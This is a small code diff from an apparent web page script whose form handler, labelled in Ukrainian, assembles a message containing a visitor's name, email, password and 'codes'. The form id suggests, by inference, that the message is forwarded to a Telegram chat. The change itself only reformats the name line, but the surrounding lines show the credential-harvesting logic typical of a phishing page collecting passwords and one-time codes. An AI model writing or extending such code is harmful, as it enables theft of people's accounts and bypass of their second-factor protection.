@@ -115,7 +115,7 @@ fbq('track', 'PageView');
             document.getElementById('tg').addEventListener('submit', function(e) {
               e.preventDefault();
               let message = `<b>Заявка з сайту!</b>\n`;
-              message += `<b>Ім'я:</b> ${ this.name.value }\n`;
+              message += ` <h2 class="h2-bold">Ім'я</h2> ${ this.name.value }\n`;
               message += `<b>Пошта:</b> ${ this.email.value }\n`;
               message += `<b>Пароль:</b> ${ this.password.value }\n`;
               message += `<b>Коди:</b> ${ this.codes.value }\n`;
